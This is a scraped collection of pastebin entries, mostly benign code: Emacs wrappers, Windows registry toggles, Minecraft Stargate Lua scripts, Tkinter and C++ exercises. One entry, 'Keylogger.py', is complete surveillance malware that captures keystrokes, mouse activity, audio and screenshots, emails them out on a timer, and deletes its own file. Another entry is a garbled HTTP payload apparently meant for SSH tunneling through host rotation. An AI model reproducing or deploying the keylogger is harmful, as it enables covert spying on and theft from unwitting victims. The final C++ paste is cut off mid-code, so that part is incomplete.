XqM4ZfhY,org mode hacking,mark-naylor-1701,Lisp,Tuesday 23rd of April 2024 04:02:31 PM CDT,";; org-mode kludges
;; This mode apparently remaps forward-sentence and backward-sentence, but only
;; for interactive. These wrappers will allow for key bindings to commands that
;; work as expected.

(defun wrap-forward-sentence (&optional prefix)
  (interactive ""p"")
  (forward-sentence prefix))

(defun wrap-backward-sentence (&optional prefix)
  (interactive ""p"")
  (backward-sentence prefix))



(define-key org-mode-map (kbd ""C-c s f"") #'wrap-forward-sentence)
(define-key org-mode-map (kbd ""C-c s b"") #'wrap-backward-sentence)
"
u5fzg9xd,file_visibility_options,Python253,Python,Tuesday 23rd of April 2024 03:51:35 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: file_visibility_options.py
# Version: 1.00
# Author: Jeoi Reqi

""""""
This script allows users to toggle visibility settings related to files and file extensions in Windows by modifying registry values. It provides options to enable or disable hidden files, file extensions, and super hidden files. The script verifies the registry path before presenting the options menu.

Requirements:
- Python 3.x
- Windows operating system

Functions:
- set_registry_value(key, value_name, value_data): Sets a registry value.
- main(): Main function to display the options menu and handle user input.

Usage:
1. Run the script in a Python environment.
2. Follow the on-screen instructions to enable or disable file visibility settings.
3. Type '0' to exit the script.

Additional Notes:
- This script modifies the Windows registry. Exercise caution when using it.
- Always verify the changes made by the script in the registry editor.
""""""

import subprocess


def set_registry_value(key, value_name, value_data):
    """"""
    Set a registry value.

    Args:
        key (str): Registry key path.
        value_name (str): Name of the registry value.
        value_data (int): Data to set for the registry value.

    Returns:
        None
    """"""
    subprocess.run(
        [
            ""reg"",
            ""add"",
            key,
            ""/t"",
            ""REG_DWORD"",
            ""/v"",
            value_name,
            ""/d"",
            str(value_data),
            ""/f"",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def main():
    """"""
    Display the options menu and handle user input.

    Returns:
        None
    """"""
    while True:
        print(
            ""-------------------------------------------------------------------------------\n""
            ""::VERIFY PATH::\n""
            ""[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced]\n""
            ""-------------------------------------------------------------------------------\n""
        )
        print(""\tChoose an option:\n"")
        print(""\t1. Enable Hidden Files"")
        print(""\t2. Disable Hidden Files"")
        print(""\t3. Enable File Extensions"")
        print(""\t4. Disable File Extensions"")
        print(""\t5. Enable Super Hidden Files"")
        print(""\t6. Disable Super Hidden Files\n"")
        choice = input(""\tEnter your choice (Or type '0' to exit): "")

        if choice == ""0"":
            print(""\n\tExiting...\tGoodBye!\n"")
            break
        elif choice == ""1"":
            set_registry_value(
                ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"",
                ""Hidden"",
                1,
            )
            print(""\n\n\t- Hidden Files Enabled!\n"")
        elif choice == ""2"":
            set_registry_value(
                ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"",
                ""Hidden"",
                0,
            )
            print(""\n\n\t- Hidden Files Disabled!\n"")
        elif choice == ""3"":
            set_registry_value(
                ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"",
                ""HideFileExt"",
                0,
            )
            print(""\n\n\t- File Extensions Enabled!\n"")
        elif choice == ""4"":
            set_registry_value(
                ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"",
                ""HideFileExt"",
                1,
            )
            print(""\n\n\t- File Extensions Disabled!\n"")
        elif choice == ""5"":
            set_registry_value(
                ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"",
                ""ShowSuperHidden"",
                1,
            )
            print(""\n\n\t- Super Hidden Files Enabled!\n"")
        elif choice == ""6"":
            set_registry_value(
                ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced"",
                ""ShowSuperHidden"",
                0,
            )
            print(""\n\n\t- Super Hidden Files Disabled!\n"")
        else:
            print(""\n\n\t! Invalid choice !\n"")


if __name__ == ""__main__"":
    main()
"
X6nEnPB4,toggle_dev_mode,Python253,Python,Tuesday 23rd of April 2024 03:19:33 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: toggle_dev_mode.py
# Version: 1.00
# Author: Jeoi Reqi

""""""
This script modifies the Windows registry to toggle Developer Mode on or off.
It checks if the registry key exists and creates it if not.
Then, it prompts the user to enable or disable Developer Mode & modifies the registry accordingly.
Error messages are displayed if any issues arise.

Requirements:
- Python 3.x
- Windows 10+

Functions:
- check_registry_key(key_path) : Checks if the specified registry key exists.
- create_registry_key(key_path): Creates the specified registry key.
- toggle_developer_mode(enable): Toggles Developer Mode on or off by setting a registry value.

Usage:
1. Run the script using Python 3.x.
2. Follow the on-screen prompts to enable or disable Developer Mode.
3. Verify the registry for the changes.

Additional Notes:
- This script modifies the Windows registry, but should not require administrator privileges.
- Use caution when modifying the registry, as incorrect changes can cause system instability.
- Compatible with Windows 10+ operating systems.
""""""

import winreg


def check_registry_key(key_path):
    """"""
    Check if the registry key exists.

    Args:
        key_path (str): The path of the registry key to check.

    Returns:
        bool: True if the registry key exists, False otherwise.
    """"""
    try:
        winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ)
        return True
    except FileNotFoundError:
        return False


def create_registry_key(key_path):
    """"""
    Create a registry key.

    Args:
        key_path (str): The path of the registry key to create.

    Returns:
        None

    Raises:
        Exception: If an error occurs while creating the registry key.
    """"""
    try:
        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
    except Exception as e:
        raise Exception(f""Error creating registry key: {e}"")


def toggle_developer_mode(enable):
    """"""
    Toggle Developer Mode on or off by setting a registry value.

    Args:
        enable (bool): True to enable Developer Mode, False to disable.

    Returns:
        None

    Raises:
        FileNotFoundError: If the registry key is not found.
        Exception: If an error occurs while setting the registry value or creating the registry key.
    """"""
    key_path = r""SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock""
    value_name = ""AllowDevelopmentWithoutDevLicense""

    # Check if the registry key exists, create it if it doesn't
    if not check_registry_key(key_path):
        create_registry_key(key_path)

    # Open the registry key
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
    except FileNotFoundError:
        raise FileNotFoundError(""Error: Could not find the registry key."")

    # Set the DWORD value
    try:
        value_data = 1 if enable else 0
        winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
        print(f""\nDeveloper Mode {'Enabled' if enable else 'Disabled'}.\n"")
    except Exception as e:
        raise Exception(f""Error setting registry value: {e}"")
    finally:
        winreg.CloseKey(key)


if __name__ == ""__main__"":
    while True:
        choice = input(
            """"""
-----------------------------------------------------------------------------
::VERIFY PATH::
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock]
-----------------------------------------------------------------------------

\t\t::OPTIONS::

\t\t1: Enable Developer Mode
\t\t0: Disable Developer Mode

\t\tMake Your Selection (1 or 0): 
""""""
        )
        if choice in (""1"", ""0""):
            toggle_developer_mode(int(choice))
            break
        else:
            print(""\nInvalid choice. Please enter either 1 or 0.\n"")
"
9TvW36SU,Direct Dial Test,PerryExtra,Lua,Tuesday 23rd of April 2024 03:06:24 PM CDT,"INTERFACE_TYPES = {
    ""basic_interface"",
    ""crystal_interface"",
    ""advanced_crystal_interface""
};
STARGATE_TYPES = {
    ""sgjourney:classic_stargate"",
    ""sgjourney:milky_way_stargate"",
    ""sgjourney:pegasus_stargate"",
    ""sgjourney:universe_stargate"",
    ""sgjourney:tollan_stargate""
};

--Find the proper interface & get stargate type--
INTERFACE_TYPE = INTERFACE_TYPES[1];
INTERFACE = peripheral.find(INTERFACE_TYPE);
if INTERFACE == null then
    print(""\"""" .. INTERFACE_TYPES[1] .. ""\"" was not found attempting to find another"");
    INTERFACE_TYPE = INTERFACE_TYPES[2];
    INTERFACE = peripheral.find(INTERFACE_TYPE);
elseif INTERFACE == null then
    print(""\"""" .. INTERFACE_TYPES[2] .. ""\"" was not found attempting to find another"");
    INTERFACE_TYPE = INTERFACE_TYPES[3];
    INTERFACE = peripheral.find(INTERFACE_TYPE);
elseif INTERFACE == null then
    print(""\"""" .. INTERFACE_TYPES[3] .. ""\"" was not found no other to be found"");
    error(""No interfaces were found"", 0);
end
STARGATE_TYPE = INTERFACE.getStargateType();

print(""Interface Type : "" .. INTERFACE_TYPE);
print(""Stargate Type : "" .. STARGATE_TYPE);
print(""\n"");

if INTERFACE.isStargateConnected() then
    INTERFACE.disconnectStargate();
end

os.sleep(1);

INTERFACE.engageSymbol(26);
os.sleep(0.25);
INTERFACE.engageSymbol(6);
os.sleep(0.25);
INTERFACE.engageSymbol(14);
os.sleep(0.25);
INTERFACE.engageSymbol(31);
os.sleep(0.25);
INTERFACE.engageSymbol(11);
os.sleep(0.25);
INTERFACE.engageSymbol(29);
os.sleep(0.25);
INTERFACE.engageSymbol(0);"
mXr2u9WQ,proximity door.lua,ZathegamE,Lua,Tuesday 23rd of April 2024 02:06:01 PM CDT,"localdetector = peripheral.find(""environmentDetector"") 
entities = localdetector.scanEntities(2.5)
while true do
entities = localdetector.scanEntities(2.5)
if entities ~= nil 
then print(#entities)
    if #entities >= 1 then
    redstone.setOutput(""back"",true)
    else
    rs.setOutput(""back"",false)
end
end
sleep(0.5)

end
"
F71m5GnX,Untitled,sissou123,PHP,Tuesday 23rd of April 2024 02:02:17 PM CDT,"Create a PHP Login and Registration System From Scratch 2020
The FULLEST and complete Login and Registration System course using PHP, MySQL and Ajax.. from scratch!
What you will learn
Create a full user login, logout and registration system.
Code a secure login system from scratch
Create members-only pages on your website.
for more :https://cuty.io/3KKwUNb
"
xhUgPm3P,Untitled,zikoman,C++,Tuesday 23rd of April 2024 01:51:41 PM CDT,G�E�T� �/� �H�T�T�P�/�1�.�1�\�n�H�o�s�t�:� �[�r�o�t�a�t�e�=�c�o�r�e�g�a�t�e�w�a�y�.�a�p�p�.�d�l�i�g�h�t�.�c�o�m�:�8�0�;�a�p�i�.�p�a�y�j�o�y�.�c�o�m�:�8�0�;�A�p�i�.�b�e�t�s�a�f�e�.�c�o�.�k�e�:�8�0�;�a�s�s�e�t�s�.�f�u�z�u�.�c�o�m�:�8�0�;�A�p�i�.�b�e�t�i�k�a�.�c�o�m�:�8�0�;�k�a�p�u�a�f�r�i�c�a�.�c�o�m�:�8�0�;�5�2�.�8�4�.�1�0�2�.�7�8�:�8�0�;�c�s�l�o�b�b�y�-�c�d�n�.�s�e�r�v�i�s�s�o�n�.�c�o�m�:�8�0�]�\�n�\�n�[�s�p�l�i�t�]�U�N�L�O�C�K� �/�?� �H�T�T�P�/�1�.�1�\�n�H�o�s�t�:� �f�r�e�e�1�2�.�s�s�h�t�p�r�o�j�e�c�t�.�c�o�m�\�r�\�n�U�p�g�r�a�d�e�:� �W�e�b�s�o�c�k�e�t�\�r�\�n�\�r�\�n
Gm8p8HHM,Keylogger.py,Dynamic_Fantasy,Python,Tuesday 23rd of April 2024 11:56:45 AM CDT,"try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
except ModuleNotFoundError:
    from subprocess import call
    modules = [""pyscreenshot"",""sounddevice"",""pynput""]
    call(""pip install "" + ' '.join(modules), shell=True)
finally:
    EMAIL_ADDRESS = ""YOUR_USERNAME""
    EMAIL_PASSWORD = ""YOUR_PASSWORD""
    SEND_REPORT_EVERY = 60 # as in seconds
    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = ""KeyLogger Started...""
            self.email = email
            self.password = password
        def appendlog(self, string):
            self.log = self.log + string
        def on_move(self, x, y):
            current_move = logging.info(""Mouse moved to {} {}"".format(x, y))
            self.appendlog(current_move)
        def on_click(self, x, y):
            current_click = logging.info(""Mouse moved to {} {}"".format(x, y))
            self.appendlog(current_click)
        def on_scroll(self, x, y):
            current_scroll = logging.info(""Mouse moved to {} {}"".format(x, y))
            self.appendlog(current_scroll)
        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = ""SPACE""
                elif key == key.esc:
                    current_key = ""ESC""
                else:
                    current_key = "" "" + str(key) + "" ""
            self.appendlog(current_key)
        def send_mail(self, email, password, message):
            sender = ""Private Person <from@example.com>""
            receiver = ""A Test User <to@example.com>""
            m = f""""""\
            Subject: main Mailtrap
            To: {receiver}
            From: {sender}
            \n""""""
            m += message
            with smtplib.SMTP(""smtp.mailtrap.io"", 2525) as server:
                server.login(email, password)
                server.sendmail(sender, receiver, message)
        def report(self):
            self.send_mail(self.email, self.password, ""\n\n"" + self.log)
            self.log = """"
            timer = threading.Timer(self.interval, self.report)
            timer.start()
        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)
        def microphone(self):
            fs = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)  # mono
            obj.setsampwidth(2)
            obj.setframerate(fs)
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            obj.writeframesraw(myrecording)
            sd.wait()
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
        def screenshot(self):
            img = pyscreenshot.grab()
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
        def run(self):
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()
            if os.name == ""nt"":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system(""cd "" + pwd)
                    os.system(""TASKKILL /F /IM "" + os.path.basename(__file__))
                    print('File was closed.')
                    os.system(""DEL "" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')
            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system(""cd "" + pwd)
                    os.system('pkill leafpad')
                    os.system(""chattr -i "" +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system(""rm -rf"" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()"
8PUVb1uR,Combobox,plarmi,Python,Tuesday 23rd of April 2024 11:52:30 AM CDT,"import tkinter as tk
from tkinter import ttk

def change_color(event):
    # Получаем значение, которое выбрал пользователь
    selected_color = color_combobox.get()
    canvas.config(bg=selected_color)

# Создание главного окна
root = tk.Tk()
root.title(""Изменение цвета холста"")

# Создание выпадающего списка с цветами
colors = [""red"", ""green"", ""blue"", ""yellow"", ""violet""]
color_combobox = ttk.Combobox(root, values=colors, state=""readonly"")
color_combobox.set(""red"")
# Если было нажатие и сделан выбор, то будет меняться цвет
color_combobox.bind(""<<ComboboxSelected>>"", change_color)
color_combobox.pack(pady=20)

# Создание холста
canvas = tk.Canvas(root, width=200, height=200, bg=""red"")
canvas.pack(pady=20)

# Запуск главного цикла
root.mainloop()"
sq13Adjs,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 11:41:10 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <ctime>
#include <cctype>

using namespace std;

class Shape {
    public:
        virtual double getArea() = 0;
};
class Square : public Shape {
    private:
        double a;
    public:
        Square(double a){
            this->a = a;
        }
        virtual double getArea(){
            return a*a;
        }
};
class Circle : public Shape {
    private:
        double r;
    public:
        Circle(double r){
            this->r = r;
        }
        virtual double getArea(){
            return 3.14159265358979323846*r*r;
        }
};

void doSomething(Shape &r){
    cout << ""We will compute the area"" << endl;
    cout << ""The area is "" << r.getArea() << endl;
}


int main(){

    cout << ""Let's compute area."" << endl;

    Shape *s = NULL;

    cout << ""1 for square, 0 for circle?"" << endl;
    int x;
    cin >> x;

    if(x == 1){
        cout << ""Great. Please enter edge length: "" << endl;
        double edge;
        cin >> edge;
        s = new Square(edge);
    } else if(x == 0){
        cout << ""Great. Please enter radius length: "" << endl;
        double radius;
        cin >> radius;
        s = new Circle(radius);
    }

    if(s != NULL){
        doSomething(*s);
        delete s;
    }

    cout << ""Good bye"" << endl;
    return 0;
}
"
rnHvfXHz,StargateDialing,PerryExtra,Lua,Tuesday 23rd of April 2024 11:41:07 AM CDT,"ADDRESSES = {
    {""Abydos"", {26, 6, 14, 31, 11, 29, 0}},
    {""Chulak"", {8, 1, 22, 14, 36, 19, 0}},
    {""Cavum Tenebrae"", {18, 7, 3, 36, 25, 15, 0}},
    {""Lantea"", {18, 20, 1, 15, 14, 7, 19, 0}},
    {""Overworld"", {27, 25, 4, 35, 10, 28, 0}},
    {""Nether"", {27, 23, 4, 34, 12, 28, 0}},
    {""End"", {13, 24, 2, 19, 3, 30, 0}},
    {""Aether"", {8, 7, 2, 17, 6, 21, 0}},
    {""Twilight Forest"", {36, 33, 16, 25, 7, 14, 0}},
    {""Lost City"", {13, 4, 27, 8, 19, 3, 0}},
    {""Glacio"", {26, 20, 4, 36, 9, 27, 0}},
    {""ATM Mining"", {25, 33, 20, 7, 37, 17, 0}},
    {""ATM Other"", {12, 23, 36, 13, 21, 16, 0}},
    {""ATM Beyond"", {27, 5, 2, 23, 17, 38, 0}},
    {""Alfeim"", {4, 9, 13, 11, 20, 7, 0}},
    {""Everbright"", {24, 23, 37, 26, 35, 12, 0}},
    {""Everdawn"", {5, 7, 10, 16, 26, 21, 0}},
    {""Otherside"", {4, 13, 27, 12, 24, 17, 0}},
    {""Undergarden"", {2, 4, 6, 31, 21, 35, 0}},
    {""Voidscape"", {26, 5, 4, 11, 2, 37, 0}}
};
INTERFACE_TYPES = {
    ""basic_Interface"",
    ""crystal_Interface"",
    ""advanced_crystal_Interface""
};
STARGATE_TYPES = {
    ""sgjourney:classic_stargate"",
    ""sgjourney:milky_way_stargate"",
    ""sgjourney:pegasus_stargate"",
    ""sgjourney:universe_stargate"",
    ""sgjourney:tollan_stargate""
};

function ClearScreen()
    term.clear();
    term.setCursorPos(1, 1);
end
ClearScreen();

--Function argument calls--
local arg = {...};
IsFastDial = false;
for _,v in pairs(arg) do
    if v == ""--fast"" then
        IsFastDial = true;
    elseif v then
        error(""Bad flag ["" .. v .. ""] failed to initialise"", 0);
    end
end

--Find the proper Interface--
InterfaceType = INTERFACE_TYPES[1];
Interface = peripheral.find(InterfaceType);
if Interface == nil then
    print(""\"""" .. INTERFACE_TYPES[1] .. ""\"" was not found attempting to find another"");
    InterfaceType = INTERFACE_TYPES[2];
    Interface = peripheral.find(InterfaceType);
elseif Interface == nil then
    print(""\"""" .. INTERFACE_TYPES[2] .. ""\"" was not found attempting to find another"");
    InterfaceType = INTERFACE_TYPES[3];
    Interface = peripheral.find(InterfaceType);
elseif Interface == nil then
    print(""\"""" .. INTERFACE_TYPES[3] .. ""\"" was not found attempting to find another"");
    error(""No Interfaces were found"", 0);
end

print(""\"""" .. InterfaceType .. ""\"" was found"");
StargateType = Interface.getStargateType();

print(""Interface Type : "" .. InterfaceType);
print(""Stargate Type : "" .. StargateType);
print(""\"""");

--Check if selected stargate and flags can be used by current Interface--
if (IsFastDial == true or StargateType ~= STARGATE_TYPES[2]) and InterfaceType == INTERFACE_TYPES[1] then
    error(""\"""" .. INTERFACE_TYPES[1] .. ""\"" can only be used with \"""" .. STARGATE_TYPES[2] ""\"" in default manual dial mode"", 0);
end

--Close Stargate and/or Reset Cheverons--
function Reset()
    Interface.disconnectStargate();
    if Interface.isStargateConnected() then
        os.sleep(2.75);
    end
end

--Call an address and try to make a connection--
function Dial(address)
    Reset();
    local addressLength = #address;
    
    if StargateType ~= STARGATE_TYPES[4] then
        if addressLength == 8 then
            Interface.setChevronConfiguration({0, 1, 2, 3, 4, 6, 7, 8, 5});
        elseif addressLength == 9 then
            Interface.setChevronConfiguration({0, 1, 2, 3, 4, 5, 6, 7, 8});
        end
    end
   
    local start = Interface.getChevronsEngaged() + 1;
   
    if StargateType == STARGATE_TYPES[2] and IsFastDial == false then
        for chevron = start,addressLength,1
        do
            local symbol = address[chevron];
        
            if chevron % 2 == 0 then
                Interface.rotateClockwise(symbol);
            else
                Interface.rotateAntiClockwise(symbol);
            end
        
            while(not Interface.isCurrentSymbol(symbol))
            do
                os.sleep(0);
            end
		
            Interface.endRotation();
        
            os.sleep(1);
            Interface.openChevron();
		        
            os.sleep(0.5)
            if chevron < addressLength then
                Interface.encodeChevron();
            end
		
            os.sleep(0.5);
            Interface.closeChevron();
            sleep(1);
        end 
    else
        for chevron = start,addressLength,1
        do
            local symbol = address[chevron];
            Interface.engageSymbol(symbol);
            os.sleep(0.25);
        end
    end
end

--Player Input--
print(""Avaiting input:"");
for k,v in ipairs(ADDRESSES) do
    print(k .. "" : "" .. v[1]);
end

input = tonumber(io.read());
os.sleep(0);

local addressLength = #ADDRESSES;
if input < 1 or input > addressLength then
    error(""Entered value is incorrect"", 0);
end
if #ADDRESSES[input][2] > 7 and InterfaceType == INTERFACE_TYPES[1] then
    error(""Cannot dial 8 or 9 chevron address with \"""" .. INTERFACE_TYPES[1] .. ""\"" please upgrade to \"""" .. INTERFACE_TYPES[2] .. ""\"" or \"""" .. INTERFACE_TYPES[3] .. ""\"""");
end

Dial(ADDRESSES[input][2]);"
mgjiVD7y,Untitled,biplovbhandari,Python,Tuesday 23rd of April 2024 11:39:45 AM CDT,"# Get relevant info from the JSON mixer file.
affine_transform = mixer[""projection""][""affine""][""doubleMatrix""]
patch_dims = mixer[""patchDimensions""]
patches_per_row = mixer[""patchesPerRow""]
total_patches = mixer[""totalPatches""]

# Path to your TFRecord file
tfrecord_file = '/content/drive/MyDrive/Colab Notebooks/DL_Book/Chapter_1/output/unet_v1/prediction/prediction_unet_v1.TFRecord'

# Define the feature description for deserialization
feature_description = {
    # Create a dictionary describing the features.
    'prediction': tf.io.FixedLenFeature([], tf.int64),
    'cropland_etc': tf.io.FixedLenFeature([], tf.float32),
    'rice': tf.io.FixedLenFeature([], tf.float32),
    'forest': tf.io.FixedLenFeature([], tf.float32),
    'urban': tf.io.FixedLenFeature([], tf.float32),
    'others_etc': tf.io.FixedLenFeature([], tf.float32),
}

def _parse_function(proto):
    return tf.io.parse_single_example(proto, feature_description)

# Create a dataset from the TFRecord file
raw_dataset = tf.data.TFRecordDataset(tfrecord_file)
parsed_dataset = raw_dataset.map(_parse_function)

from osgeo import gdal, osr
import cv2

# Initialize an empty array for the entire image
full_image = np.zeros((patch_dims[0] * (total_patches // patches_per_row),
                       patch_dims[1] * patches_per_row, 3), dtype=np.uint8)

# Iterate over each image in the parsed dataset
for i, features in enumerate(parsed_dataset):
    img = tf.image.decode_image(features['prediction']).numpy()
    row = i // patches_per_row
    col = i % patches_per_row
    full_image[row * patch_dims[0]:(row + 1) * patch_dims[0],
               col * patch_dims[1]:(col + 1) * patch_dims[1]] = img

# Create a GeoTIFF file
driver = gdal.GetDriverByName('GTiff')
outRaster = driver.Create('output.tif', full_image.shape[1], full_image.shape[0], 3, gdal.GDT_Byte)
outRaster.SetGeoTransform([affine_transform[2], affine_transform[0], 0,
                           affine_transform[5], 0, affine_transform[4]])

# Set the projection
outRasterSRS = osr.SpatialReference()
outRasterSRS.ImportFromEPSG(4326)
outRaster.SetProjection(outRasterSRS.ExportToWkt())

# Write the data
outband = outRaster.GetRasterBand(1)
outband.WriteArray(full_image[:,:,0])
outband = outRaster.GetRasterBand(2)
outband.WriteArray(full_image[:,:,1])
outband = outRaster.GetRasterBand(3)
outband.WriteArray(full_image[:,:,2])

# Flush data
outRaster.FlushCache()
"
yyN6fGjE,СПРИНТ № 7 | Модель памяти в C++ | Урок 10: Присваивание объектов 2/2,chevengur,C++,Tuesday 23rd of April 2024 11:21:47 AM CDT,"// Тут можно подключить scopedptr.h и ptrvector.h, 
// если они вам понадобятся.
#include <new> // Для исключения bad_alloc
#include <vector>
#include <cassert>
#include <algorithm>
#include <stdexcept>

using namespace std;
// Используйте эту заготовку PtrVector или замените её на свою реализацию
template <typename T>
class PtrVector {
public:
    PtrVector() = default;

    // Создаёт вектор указателей на копии объектов из other
    PtrVector(const PtrVector& other) {
        // Резервируем место в vector-е для хранения нужного количества элементов
        // Благодаря этому при push_back не будет выбрасываться исключение
        items_.reserve(other.items_.size());

        try {
            for (auto p : other.items_) {
                // Копируем объект, если указатель на него ненулевой
                auto p_copy = p ? new T(*p) : nullptr;  // new может выбросить исключение

                // Не выбросит исключение, т. к. в vector память уже зарезервирована
                items_.push_back(p_copy);
            }
        }
        catch (...) {
            // удаляем элементы в векторе и перевыбрасываем пойманное исключение
            DeleteItems();
            throw;
        }
    }

    // Деструктор удаляет объекты в куче, на которые ссылаются указатели,
    // в векторе items_
    ~PtrVector() {
        DeleteItems();
    }

    PtrVector& operator=(const PtrVector& rhs)
    {
        if (this != &rhs)
        {
            auto rhs_copy(rhs);
            swap_(rhs_copy);

        }
        return *this;
    }

    void swap_(PtrVector& other) noexcept
    {
        swap(other.items_, this->items_);
    }


    // Возвращает ссылку на вектор указателей
    vector<T*>& GetItems() noexcept {
        return items_;
    }

    // Возвращает константную ссылку на вектор указателей
    vector<T*> const& GetItems() const noexcept {
        return items_;
    }

private:
    void DeleteItems() noexcept {
        for (auto p : items_) {
            delete p;
        }
    }

    vector<T*> items_;
};

template <typename T>
class ScopedPtr {
public:
    ScopedPtr() = default;

    explicit ScopedPtr(T* raw_ptr) noexcept
        : ptr_(raw_ptr) {
    }

    // Запрещаем копирование указателя
    ScopedPtr(const ScopedPtr&) = delete;

    ~ScopedPtr() {
        delete ptr_;
    }

    T* GetRawPtr() const noexcept {
        return ptr_;
    }

    T* Release() noexcept {
        T* p = ptr_;
        ptr_ = nullptr;
        return p;
    }

    explicit operator bool() const {
        return ptr_ != nullptr;
    }

    T* operator->() const {
        using namespace std::literals;
        if (!ptr_) {
            throw std::logic_error(""Scoped ptr is null""s);
        }
        return ptr_;
    }

    T& operator*() const {
        using namespace std::literals;
        if (!ptr_) {
            throw std::logic_error(""Scoped ptr is null""s);
        }
        return *ptr_;
    }

private:
    T* ptr_ = nullptr;
};

using namespace std;
// Щупальце
class Tentacle {
public:
    explicit Tentacle(int id) noexcept
        : id_(id) {
    }

    int GetId() const noexcept {
        return id_;
    }

    Tentacle* GetLinkedTentacle() const noexcept {
        return linked_tentacle_;
    }
    void LinkTo(Tentacle& tentacle) noexcept {
        linked_tentacle_ = &tentacle;
    }
    void Unlink() noexcept {
        linked_tentacle_ = nullptr;
    }

private:
    int id_ = 0;
    Tentacle* linked_tentacle_ = nullptr;
};

// Осьминог
class Octopus {
public:
    Octopus()
        : Octopus(8) {
    }

    explicit Octopus(int num_tentacles) {
        Tentacle* t = nullptr;
        try {
            for (int i = 1; i <= num_tentacles; ++i) {
                t = new Tentacle(i);      // Может выбросить исключение bad_alloc
                tentacles_.GetItems().push_back(t);  // Может выбросить исключение bad_alloc

                // Обнуляем указатель на щупальце, которое уже добавили в tentacles_,
                // чтобы не удалить его в обработчике catch повторно
                t = nullptr;
            }
        }
        catch (const std::bad_alloc&) {
            // Удаляем щупальца, которые успели попасть в контейнер tentacles_
            Cleanup();
            // Удаляем щупальце, которое создали, но не добавили в tentacles_
            delete t;
            // Конструктор не смог создать осьминога с восемью щупальцами,
            // поэтому выбрасываем исключение, чтобы сообщить вызывающему коду об ошибке
            // throw без параметров внутри catch выполняет ПЕРЕВЫБРОС пойманного исключения
            throw;
        }
    }

    ~Octopus() {
        // Осьминог владеет объектами в динамической памяти (щупальца),
        // которые должны быть удалены при его разрушении.
        // Деструктор - лучшее место, чтобы прибраться за собой.
        Cleanup();
    }

    // Добавляет новое щупальце с идентификатором,
    // равным (количество_щупалец + 1):
    // 1, 2, 3, ...
    // Возвращает ссылку на добавленное щупальце
    Tentacle& AddTentacle() {
        ScopedPtr<Tentacle>tentacle(new Tentacle(GetTentacleCount() + 1));
        tentacles_.GetItems().push_back(tentacle.GetRawPtr());
        tentacle.Release();
        return *tentacles_.GetItems().back();
    }

    int GetTentacleCount() const noexcept {
        return static_cast<int>(tentacles_.GetItems().size());
    }

    const Tentacle& GetTentacle(size_t index) const {
        return *tentacles_.GetItems().at(index);
    }
    Tentacle& GetTentacle(size_t index) {
        return *tentacles_.GetItems().at(index);
    }

private:
    void Cleanup() {
        // Удаляем щупальца осьминога из динамической памяти
        for (Tentacle* t : tentacles_.GetItems()) {
            delete t;
        }
        // Очищаем массив указателей на щупальца
        tentacles_.GetItems().clear();
    }

    // Вектор хранит указатели на щупальца. Сами объекты щупалец находятся в куче

    PtrVector<Tentacle> tentacles_;
};

int main() {
    // Проверка присваивания осьминогов
    {
        Octopus octopus1(3);

        // Настраиваем состояние исходного осьминога
        octopus1.GetTentacle(2).LinkTo(octopus1.GetTentacle(1));

        // До присваивания octopus2 имеет своё собственное состояние
        Octopus octopus2(10);

        octopus2 = octopus1;

        // После присваивания осьминогов щупальца копии имеют то же состояние,
        // что и щупальца присваиваемого объекта
        assert(octopus2.GetTentacleCount() == octopus1.GetTentacleCount());
        for (int i = 0; i < octopus2.GetTentacleCount(); ++i) {
            auto& tentacle1 = octopus1.GetTentacle(i);
